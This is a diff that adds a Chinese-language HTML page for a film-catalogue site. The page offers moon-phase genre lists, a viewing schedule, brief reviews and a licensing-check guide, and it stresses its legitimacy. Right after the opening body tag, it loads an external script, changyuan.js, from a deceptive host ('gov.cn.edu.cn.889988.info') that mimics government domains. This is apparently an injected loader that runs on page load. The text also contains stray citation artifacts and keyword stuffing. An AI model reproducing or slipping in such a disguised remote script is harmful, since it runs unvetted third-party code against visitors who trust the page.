@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>月光影视：月相片单、潮汐排片与银幕影评，附正版授权核验｜yueguangyingshi-top.github.io</title>
+<meta name="description" content="月光影视以月相夜潮为版面，按新月喜剧、上弦治愈、满月动作、残月悬疑四类整理移动端片单，提供潮汐排片时段、银幕影评与正版平台核验流程。页面移动端自适应，符合必应收录规范；仅作影视分类、剧情摘要与取得信息网络传播权的正规渠道指引，不提供未授权在线播放、网盘合集或破解资源。完整目录见 https://yueguangyingshi-top.github.io。">
+<meta name="keywords" content="月光影视, 月相片单, 潮汐排片, 银幕影评, 正版授权核验, 新月喜剧电影, 上弦治愈片, 满月动作片, 残月悬疑片, yueguangyingshi-top.github.io">
+<meta name="robots" content="index, follow">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --night:#070b16;--night2:#0c1326;--panel:#101a33;--panel2:#16223f;
+  --line:#26365f;--line2:#3a528c;
+  --moon:#dfe7ff;--moon2:#aab8e8;--silver:#c8d2e6;--foam:#7fd9ff;--foam2:#39a7d8;
+  --amber:#ffd98a;--amber2:#d8a94e;--rose:#ff9bb6;--violet:#b3a6ff;
+  --text:#e8edfb;--muted:#8090b8;--dim:#566089;
+  --shadow:0 18px 40px rgba(0,0,0,.45);--radius:16px;
+}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Segoe UI",system-ui,sans-serif;
+  color:var(--text);line-height:1.85;background:var(--night);
+  background-image:
+    radial-gradient(620px 320px at 12% 8%,rgba(127,217,255,.10),transparent 60%),
+    radial-gradient(520px 260px at 88% 16%,rgba(255,217,138,.08),transparent 60%),
+    radial-gradient(900px 500px at 50% 120%,rgba(179,166,255,.06),transparent 60%);
+  -webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:var(--foam);transition:.22s}
+a:hover{color:var(--moon)}
+ul{list-style:none}
+.container{max-width:1200px;margin:0 auto;padding:0 20px}
+
+/* 月相刻度顶栏 */
+.phase-bar{background:#05080f;border-bottom:1px solid var(--line);position:relative;overflow:hidden}
+.phase-bar .container{display:flex;align-items:center;gap:14px;min-height:42px;flex-wrap:wrap;padding:9px 20px}
+.phase-bar .moonface{width:20px;height:20px;border-radius:50%;background:radial-gradient(circle at 32% 30%,var(--moon),var(--moon2) 60%,#5b6aa0 100%);box-shadow:0 0 10px rgba(223,231,255,.4);flex-shrink:0}
+.phase-bar .scale{font-size:.74rem;color:var(--silver);letter-spacing:1px}
+.phase-bar .scale a{color:var(--silver)}
+.phase-bar .scale a:hover{color:var(--foam);background:transparent}
+.phase-bar .tide{margin-left:auto;font-size:.73rem;color:var(--foam);font-family:"Courier New",monospace}
+.phase-bar .tide .dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--foam);box-shadow:0 0 6px var(--foam);margin-right:6px;animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* Hero 月盘 */
+.moon-hero{padding:58px 0 48px;position:relative;overflow:hidden}
+.moon-hero .container{display:grid;grid-template-columns:1.05fr 1fr;gap:44px;align-items:center}
+.disc{position:relative;width:100%;max-width:380px;aspect-ratio:1;margin:0 auto;border-radius:50%;background:radial-gradient(circle at 34% 30%,#1a2548,#0a1124 70%);border:2px solid var(--line2);box-shadow:var(--shadow);overflow:hidden}
+.disc::before{content:"";position:absolute;inset:0;border-radius:50%;background:conic-gradient(from 220deg,rgba(127,217,255,.10),rgba(255,217,138,.08),rgba(179,166,255,.08),rgba(127,217,255,.10))}
+.disc .crater{position:absolute;border-radius:50%;background:rgba(255,255,255,.05);box-shadow:inset 0 0 12px rgba(0,0,0,.4)}
+.disc .crater.c1{width:54px;height:54px;top:22%;left:24%}
+.disc .crater.c2{width:34px;height:34px;top:54%;left:60%}
+.disc .crater.c3{width:24px;height:24px;top:68%;left:30%}
+.disc .phase{position:absolute;top:18%;right:18%;font-size:1.6rem;color:var(--moon)}
+.disc .hub{position:absolute;left:50%;bottom:14%;transform:translateX(-50%) rotate(-2deg);width:78%;background:#05080f;border:1px solid var(--foam2);border-radius:12px;padding:12px 14px;font-family:"Courier New",monospace;font-size:.66rem;color:var(--foam);text-align:center;word-break:break-all}
+.disc .hub .lbl{display:block;font-size:.6rem;color:var(--moon2);letter-spacing:2px;margin-bottom:5px}
+.disc .hub a{color:var(--foam)}
+.disc .hub a:hover{color:var(--moon);background:transparent}
+
+.hero-text .tag{display:inline-block;font-family:"Courier New",monospace;font-size:.72rem;letter-spacing:2px;color:var(--night);background:var(--moon);padding:5px 12px;border-radius:5px;margin-bottom:14px}
+.hero-text h1{font-size:clamp(2rem,4.6vw,3rem);line-height:1.22;margin-bottom:12px;letter-spacing:1px}
+.hero-text h1 b{color:var(--moon);text-shadow:0 0 16px rgba(223,231,255,.25)}
+.hero-text h1 .sub{display:block;font-size:.46em;color:var(--silver);letter-spacing:3px;margin-top:8px;font-family:"Courier New",monospace}
+.hero-text .lead{color:var(--silver);font-size:.96rem;max-width:540px;margin-bottom:16px}
+.hero-text .rule{color:var(--muted);font-size:.84rem;max-width:540px;margin-bottom:18px;border-left:3px solid var(--foam2);padding-left:12px}
+
+nav{margin:22px 0 50px}
+nav ul{display:flex;flex-wrap:wrap;gap:12px;justify-content:center}
+nav a{min-height:48px;display:inline-flex;align-items:center;gap:9px;padding:0 22px;border:1px solid var(--line2);border-radius:18px 8px 18px 8px;background:var(--panel);font-size:.9rem;color:var(--text)}
+nav a .ph{width:9px;height:9px;border-radius:50%;background:var(--moon);box-shadow:0 0 6px var(--moon)}
+nav a:hover{background:var(--panel2);border-color:var(--foam2);color:var(--foam)}
+
+main{padding-bottom:60px}
+section{margin-bottom:74px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:28px;box-shadow:var(--shadow)}
+.colhead{display:flex;align-items:center;gap:12px;margin-bottom:22px;flex-wrap:wrap}
+.colhead .idx{font-family:"Courier New",monospace;font-size:.74rem;color:var(--night);background:var(--foam);padding:5px 10px;border-radius:5px}
+.colhead h2{font-size:1.46rem;color:var(--text);letter-spacing:1px}
+.colhead .en{font-family:"Courier New",monospace;font-size:.72rem;color:var(--muted)}
+.colhead .coord{margin-left:auto;font-family:"Courier New",monospace;font-size:.72rem;color:var(--moon2);border:1px dashed var(--line2);padding:5px 10px;border-radius:5px}
+.colhead .coord a{color:var(--moon2)}
+.colhead .coord a:hover{color:var(--foam);background:transparent}
+
+/* 月相片单 */
+.phases{display:grid;grid-template-columns:repeat(auto-fit,minmax(252px,1fr));gap:22px}
+.phase{background:var(--panel2);border:1px solid var(--line);border-radius:var(--radius);padding:22px;position:relative;overflow:hidden}
+.phase::after{content:"";position:absolute;right:-30px;top:-30px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(223,231,255,.18),transparent 70%)}
+.phase.new::after{background:radial-gradient(circle at 30% 30%,rgba(127,217,255,.20),transparent 70%)}
+.phase.first::after{background:radial-gradient(circle at 30% 30%,rgba(255,217,138,.20),transparent 70%)}
+.phase.full::after{background:radial-gradient(circle at 30% 30%,rgba(255,155,182,.18),transparent 70%)}
+.phase.last::after{background:radial-gradient(circle at 30% 30%,rgba(179,166,255,.18),transparent 70%)}
+.phase .ico{font-size:1.4rem;margin-bottom:8px;display:block}
+.phase h3{font-size:1.08rem;margin-bottom:6px}
+.phase h3 a{color:var(--text)}
+.phase:hover h3 a{color:var(--foam)}
+.phase p{font-size:.84rem;color:var(--silver);margin-bottom:10px}
+.phase ul li{padding:5px 0 5px 16px;position:relative;font-size:.8rem;color:var(--muted);border-bottom:1px solid var(--line)}
+.phase ul li:last-child{border-bottom:0}
+.phase ul li::before{content:"☾";position:absolute;left:0;font-size:.62rem;top:6px;color:var(--moon2)}
+
+/* 潮汐排片 */
+.tideboard{border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;background:var(--panel2)}
+.trow{display:grid;grid-template-columns:120px 1fr 130px 110px;align-items:center;border-bottom:1px solid var(--line)}
+.trow:last-child{border-bottom:0}
+.thead{background:#05080f;font-family:"Courier New",monospace;font-size:.74rem;color:var(--foam)}
+.thead>div{padding:12px 14px}
+.trow>div{padding:13px 14px;font-size:.86px;font-size:.86rem}
+.trow:nth-child(even){background:rgba(7,11,22,.45)}
+.ttime{font-family:"Courier New",monospace;font-size:.8rem;color:var(--moon)}
+.ttime b{color:var(--foam);font-weight:400}
+.tfilm a{color:var(--text);font-size:.92rem}
+.tfilm a:hover{color:var(--foam)}
+.tlevel{font-size:.76rem;color:var(--silver)}
+.tlevel .bar{display:inline-block;width:46px;height:6px;border-radius:4px;background:#0a1124;vertical-align:middle;margin-right:7px;overflow:hidden}
+.tlevel .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--foam2),var(--foam))}
+.tchk a{font-family:"Courier New",monospace;font-size:.76rem;color:var(--night);background:var(--moon);padding:5px 10px;border-radius:6px;display:inline-block}
+.tchk a:hover{background:var(--foam);color:var(--night)}
+
+/* 银幕影评 */
+.reels{display:grid;grid-template-columns:1fr 1fr;gap:22px}
+.reel{background:var(--panel2);border:1px solid var(--line);border-radius:var(--radius);padding:22px;position:relative;box-shadow:var(--shadow)}
+.reel .frame{position:absolute;top:16px;right:16px;font-size:1.4rem;color:var(--moon2);transform:rotate(-8deg)}
+.reel h3{font-size:1.04rem;margin-bottom:8px;padding-right:52px}
+.reel h3 a{color:var(--text)}
+.reel h3 a:hover{color:var(--foam)}
+.reel .meta{font-family:"Courier New",monospace;font-size:.72rem;color:var(--muted);margin-bottom:10px}
+.reel p{font-size:.84rem;color:var(--silver);margin-bottom:10px}
+.reel .quote{border-left:3px solid var(--foam2);padding-left:10px;font-size:.82rem;color:var(--text);margin-bottom:10px;font-style:italic}
+.reel .tags{display:flex;gap:8px;flex-wrap:wrap}
+.reel .tags span{font-size:.72rem;font-family:"Courier New",monospace;padding:4px 9px;border:1px solid var(--line2);border-radius:6px;color:var(--foam)}
+
+/* 正版核验 */
+.rights{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:30px;position:relative;overflow:hidden}
+.rights::before{content:"☽";position:absolute;top:-18px;right:18px;font-size:7rem;color:rgba(223,231,255,.06)}
+.rights h2{font-size:1.46rem;color:var(--moon);margin-bottom:12px}
+.rights p{font-size:.88rem;color:var(--silver);margin-bottom:12px;max-width:880px}
+.rsteps{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin:16px 0}
+.rstep{border:1px dashed var(--line2);border-radius:8px;padding:14px;background:var(--panel2)}
+.rstep b{display:block;font-family:"Courier New",monospace;font-size:.76rem;color:var(--foam);margin-bottom:6px}
+.rnote{margin-top:12px;font-size:.78rem;color:var(--muted);border-top:1px solid var(--line);padding-top:14px;line-height:1.8}
+.rnote b{color:var(--moon)}
+
+footer{background:#05080f;color:var(--muted);padding:34px 0;margin-top:54px;border-top:1px solid var(--line)}
+footer .container{text-align:center}
+footer p{font-size:.82rem;margin-bottom:6px}
+footer .glow{display:inline-block;margin-top:8px;font-family:"Courier New",monospace;font-size:.86rem;color:var(--text);border:1px solid var(--foam2);padding:10px 16px;border-radius:10px;background:#0a1124}
+footer .glow a{color:var(--text)}
+footer .glow a:hover{color:var(--foam);background:transparent}
+
+@media(max-width:960px){
+  .moon-hero .container{grid-template-columns:1fr}
+  .disc{max-width:320px}
+}
+@media(max-width:768px){
+  .phase-bar .container{flex-direction:column;align-items:flex-start;gap:4px;padding:10px 20px}
+  .phase-bar .tide{margin-left:0}
+  .moon-hero{padding:38px 0 28px}
+  .disc{max-width:260px}
+  .disc .hub{font-size:.58rem}
+  nav ul{gap:8px}
+  nav a{padding:0 16px;font-size:.86rem;min-height:44px}
+  .colhead h2{font-size:1.24rem}
+  .colhead .coord{margin-left:0;width:100%}
+  .panel{padding:20px}
+  .reels{grid-template-columns:1fr}
+  .thead{display:none}
+  .trow{display:block;border-bottom:2px solid var(--line);padding:0}
+  .trow>div{display:flex;justify-content:space-between;gap:10px;border-bottom:1px dashed var(--line);padding:10px 14px}
+  .trow>div:last-child{border-bottom:0}
+  .trow>div::before{content:attr(data-label);font-family:"Courier New",monospace;font-size:.72rem;color:var(--foam);flex-shrink:0}
+  .tfilm{flex-direction:column;align-items:flex-start!important}
+  .tfilm::before{margin-bottom:4px}
+  .tchk{flex-direction:column;align-items:flex-start!important}
+  .tchk::before{margin-bottom:4px}
+  footer .glow{font-size:.8rem;word-break:break-all}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="phase-bar">
+  <div class="container">
+    <span class="moonface" aria-hidden="true"></span>
+    <span class="scale">月光影视月相站 · 片单/排片/影评 · <a href="https://yueguangyingshi-top.github.io">yueguangyingshi-top.github.io</a></span>
+    <span class="tide"><span class="dot"></span>tide:正版排片中</span>
+  </div>
+</div>
+
+<div class="moon-hero">
+  <div class="container">
+    <div class="hero-text">
+      <span class="tag">LUNAR FILM INDEX</span>
+      <h1><b>月光影视</b><span class="sub">— 月相片单 · 潮汐排片 —</span></h1>
+      <p class="lead">按新月、上弦、满月、残月分四类片单：新月轻喜剧、上弦治愈、满月动作、残月悬疑。每部标节奏、亮度和适合夜段，只做分类和正版渠道，不写未授权片源。</p>
+      <p class="rule">月光影视仅作影视分类、剧情摘要与正版指引；不提供未授权在线播放、网盘合集、聚合盗链或破解播放器。网络传播影片应核权属与授权，境内网上播境外影视另核公映/发行许可及信息网络传播权，专门网络传播还需对应视听节目许可。[8,19,22](@ref)</p>
+      <nav>
+        <ul>
+          <li><a href="#phases"><span class="ph"></span>月相片单</a></li>
+          <li><a href="#tide"><span class="ph"></span>潮汐排片</a></li>
+          <li><a href="#reels"><span class="ph"></span>银幕影评</a></li>
+          <li><a href="#rights"><span class="ph"></span>正版核验</a></li>
+        </ul>
+      </nav>
+    </div>
+
+    <div class="disc" role="img" aria-label="月盘中央显示月光影视网址">
+      <span class="crater c1"></span>
+      <span class="crater c2"></span>
+      <span class="crater c3"></span>
+      <span class="phase">☽</span>
+      <div class="hub">
+        <span class="lbl">LUNAR HALL</span>
+        <a href="https://yueguangyingshi-top.github.io">https://yueguangyingshi-top.github.io</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<main class="container">
+
+  <section id="phases" class="panel">
+    <div class="colhead">
+      <span class="idx">P-1</span>
+      <h2>月相片单</h2>
+      <span class="en">lunar genre catalog</span>
+      <span class="coord">phase：<a href="https://yueguangyingshi-top.github.io">yueguangyingshi-top.github.io</a></span>
+    </div>
+    <div class="phases">
+      <div class="phase new">
+        <span class="ico">🌑</span>
+        <h3><a href="#">新月喜剧·低亮度暖场</a></h3>
+        <p>开局轻、笑点密而不吵；适合深夜放松和家庭重看，不堆梗不吵闹。</p>
+        <ul>
+          <li>误会圆场与邻里有梗</li>
+          <li>职场轻讽刺不毒舌</li>
+          <li>宠物/饭桌日常线</li>
+        </ul>
+      </div>
+      <div class="phase first">
+        <span class="ico">🌓</span>
+        <h3><a href="#">上弦治愈·柔光宽场</a></h3>
+        <p>中速、空镜多；海岸、花房、夜读，适合睡前降噪，不强行煽情。</p>
+        <ul>
+          <li>海岸夜骑日记</li>
+          <li>花房与咖啡馆长镜</li>
+          <li>书信重逢日常</li>
+        </ul>
+      </div>
+      <div class="phase full">
+        <span class="ico">🌕</span>
+        <h3><a href="#">满月动作·高亮强拍</a></h3>
+        <p>快剪、救援、竞速；重节奏和协调，不靠血腥堆张力，适合周末场。</p>
+        <ul>
+          <li>山地竞速计时赛</li>
+          <li>夜间消防绳索救援</li>
+          <li>团队逆袭终局</li>
+        </ul>
+      </div>
+      <div class="phase last">
+        <span class="ico">🌗</span>
+        <h3><a href="#">残月悬疑·低光回放</a></h3>
+        <p>慢铺时间线、双视角对照；重证据链不剧透，适合安静拉片。</p>
+        <ul>
+          <li>密室时间线还原</li>
+          <li>证人证词对照</li>
+          <li>真相反转落点</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section id="tide" class="panel">
+    <div class="colhead">
+      <span class="idx">P-2</span>
+      <h2>潮汐排片</h2>
+      <span class="en">tidal schedule</span>
+      <span class="coord">tide：<a href="https://yueguangyingshi-top.github.io">yueguangyingshi-top.github.io</a></span>
+    </div>
+    <div class="tideboard">
+      <div class="thead"><div>月段</div><div>片名/基调</div><div>亮度节奏</div><div>核验</div></div>
+      <div class="trow">
+        <div class="ttime" data-label="月段"><b>新月</b> 20:30</div>
+        <div class="tfilm" data-label="片名"><a href="#">《饭桌圆场》喜剧·家庭</a></div>
+        <div class="tlevel" data-label="亮度"><span class="bar"><i style="width:40%"></i></span>低亮/轻快</div>
+        <div class="tchk" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="trow">
+        <div class="ttime" data-label="月段"><b>上弦</b> 21:30</div>
+        <div class="tfilm" data-label="片名"><a href="#">《海岸夜骑》治愈·柔光</a></div>
+        <div class="tlevel" data-label="亮度"><span class="bar"><i style="width:55%"></i></span>中亮/舒缓</div>
+        <div class="tchk" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="trow">
+        <div class="ttime" data-label="月段"><b>满月</b> 22:30</div>
+        <div class="tfilm" data-label="片名"><a href="#">《山道计时》动作·强拍</a></div>
+        <div class="tlevel" data-label="亮度"><span class="bar"><i style="width:90%"></i></span>高亮/紧促</div>
+        <div class="tchk" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="trow">
+        <div class="ttime" data-label="月段"><b>残月</b> 23:30</div>
+        <div class="tfilm" data-label="片名"><a href="#">《密室回放》悬疑·低光</a></div>
+        <div class="tlevel" data-label="亮度"><span class="bar"><i style="width:30%"></i></span>低亮/慢铺</div>
+        <div class="tchk" data-label="核验"><a href="#">核验</a></div>
+      </div>
+      <div class="trow">
+        <div class="ttime" data-label="月段"><b>尾潮</b> 01:00</div>
+        <div class="tfilm" data-label="片名"><a href="#">《月光长片》4K修复·导演评论</a></div>
+        <div class="tlevel" data-label="亮度"><span class="bar"><i style="width:70%"></i></span>中高/回放</div>
+        <div class="tchk" data-label="核验"><a href="#">核验</a></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="reels" class="panel">
+    <div class="colhead">
+      <span class="idx">P-3</span>
+      <h2>银幕影评</h2>
+      <span class="en">silver screen notes</span>
+      <span class="coord">reel：<a href="https://yueguangyingshi-top.github.io">yueguangyingshi-top.github.io</a></span>
+    </div>
+    <div class="reels">
+      <div class="reel">
+        <div class="frame">🎞️</div>
+        <h3><a href="#">《饭桌圆场》—— 新月的轻混声</a></h3>
+        <div class="meta">审片：夜场编辑 ｜ 新月评级 ★★★★☆</div>
+        <p>笑点像月光铺桌，不抢对白；全家落座那场用中景长镜，情绪递进自然，适合家庭场二刷，不费脑不尴尬。</p>
+        <div class="quote">"圆场不是认输，是把节奏放慢半拍。"</div>
+        <div class="tags"><span>月相：新月</span><span>基调：轻快</span><span>场景：饭桌</span></div>
+      </div>
+      <div class="reel">
+        <div class="frame">🎞️</div>
+        <h3><a href="#">《密室回放》—— 残月的低光线</a></h3>
+        <div class="meta">审片：银幕特约 ｜ 残月评级 ★★★★</div>
+        <p>用低光压住时间线，每回放一次补一层证据；正版版本建议开导演评论轨，证词、监控、记忆三线才对得上。</p>
+        <div class="quote">"低光不黑，它一直在数时间。"</div>
+        <div class="tags"><span>月相：残月</span><span>基调：慢铺</span><span>场景：密室</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="rights">
+    <div class="colhead">
+      <span class="idx">P-4</span>
+      <h2>正版核验</h2>
+      <span class="en">authorized rights check</span>
+    </div>
+    <div class="rights">
+      <h2>月光影视正版核验四步</h2>
+     <p>本页只列月相片单、潮汐排片与银幕影评；实际观看跳正规影视库、持牌视频平台或公开院线渠道。无权属、无信息网络传播权、强制装播放器或发网盘“完整版”的站点不纳入。[8,2,5](@ref)</p>
+      <div class="rsteps">
+        <div class="rstep"><b>1 定片名</b>原片名＋年份＋院线/剧集/修复；区分翻拍、二创剪辑与短视频解说。</div>
+        <div class="rstep"><b>2 查许可</b>国内影视核电影公映许可证或电视剧发行许可证；网络传播另核著作权人信息网络传播权，境外剧按相关规定补许可。[19,22](@ref)</div>
+        <div class="rstep"><b>3 验主体</b>看平台名、版权声明、用户协议与隐私政策；无主体、无授权截图、要无关权限的排除。[2](@ref)</div>
+        <div class="rstep"><b>4 避盗链</b>不点网盘“福利包”、破解播放器、弹窗下载器；发现未授权资源走平台投诉或版权举报。[5,16](@ref)</div>
+      </div>
+      <div class="rnote">
+        <b>夜场守则：</b>本页不提供未授权在线播放、网盘合集、破解客户端或成人低俗分类；月相片单、潮汐排片、银幕影评均为信息整理，不替代影片分级与平台当前授权。若您为著作权人并认为某条信息不当，可提交权属证明、涉及页面与整改要求至站点工单，核实后调整或删除。具体可播地区、字幕与版本以正规发行方说明为准。
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <p>月光影视 · 月相片单、潮汐排片、银幕影评与正版授权核验</p>
+    <p>关键词：月光影视｜月相片单｜潮汐排片｜银幕影评｜正版授权核验｜新月喜剧电影｜上弦治愈片｜满月动作片｜yueguangyingshi-top.github.io</p>
+    <span class="glow"><a href="https://yueguangyingshi-top.github.io">https://yueguangyingshi-top.github.io</a></span>
+  </div>
+</footer>
+</body>
+</html>
